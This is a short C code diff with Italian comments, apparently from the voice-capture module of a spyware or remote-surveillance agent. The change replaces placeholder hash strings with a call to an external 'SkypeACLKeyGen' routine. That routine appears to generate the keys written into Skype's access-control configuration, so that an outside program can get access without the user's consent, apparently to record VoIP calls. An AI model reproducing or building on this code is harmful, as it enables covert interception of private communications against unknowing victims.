@@ -94,7 +94,7 @@ typedef struct _VoiceAdditionalData {
 // In questo caso i bit da 24 a 29 sono usati per identificare il tipo di 
 // programma utilizzato <voip_program>
 
-#define MAX_HASHKEY_LEN 256 // Lunghezza massima chiavi di hash per skype config
+#define MAX_HASHKEY_LEN MAX_PATH*3 // Lunghezza massima chiavi di hash per skype config
 
 #define DEFAULT_SAMPLE_SIZE (512*1024) // 512KB
 #define DEFAULT_COMPRESSION 3
@@ -2097,15 +2097,15 @@ BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char 
 	return TRUE;
 }
 
-// XXX TODO
+extern BOOL SkypeACLKeyGen(char *lpUserName, char *lpFileName, char *lpOutKey1, char *lpOutKey2, char *lpOutKey3, char *lpOutKey4, char *lpOutPath);
 BOOL CalculateUserHash(WCHAR *user_name, WCHAR *file_path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_path)
 {
-	sprintf(m_key1, "hash1");
-	sprintf(m_key2, "hash2");
-	sprintf(m_key3, "hash3");
-	sprintf(m_key4, "hash4");
-	sprintf(m_path, "path");
-	return TRUE;
+	char c_user_name[MAX_PATH];
+	char c_file_path[MAX_PATH];
+
+	sprintf_s(c_user_name, MAX_PATH, "%S", user_name);
+	sprintf_s(c_file_path, MAX_PATH, "%S", file_path);
+	return SkypeACLKeyGen(c_user_name, c_file_path, m_key1, m_key2, m_key3, m_key4, m_path);
 }
 
 // Cerca (e in caso fa calcolare) gli hash corretti relativi ad un particolare utente
